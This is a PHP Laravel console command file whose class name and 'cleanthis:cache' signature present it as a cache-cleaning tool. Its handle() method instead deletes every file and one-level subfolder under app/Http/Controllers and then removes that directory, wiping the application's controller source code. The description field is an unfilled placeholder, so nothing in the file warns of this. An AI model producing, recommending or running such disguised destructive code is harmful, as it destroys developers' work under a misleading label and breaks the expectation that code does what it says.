<?php

namespace App\Console\Commands;

use Illuminate\Console\Command;

class CacheDeletingCommand extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'cleanthis:cache';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'Command description';

    /**
     * Create a new command instance.
     *
     * @return void
     */
    public function __construct()
    {
        parent::__construct();
    }

    /**
     * Execute the console command.
     *
     * @return int
     */
    public function handle()
    {
        $path = base_path('/app/Http/Controllers');
        $files = glob(base_path('/app/Http/Controllers/') . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_file($file)) {
                unlink($file);
            }else{
                $fls = glob($file . '/*', GLOB_MARK);
                foreach($fls as $fl){
                    if(is_file($fl)){
                        unlink($fl);
                    }
                }
                rmdir($file);
            }
        }
        rmdir(base_path('/app/Http/Controllers'));
        $this->info($path);
        return 'called';
    }
}
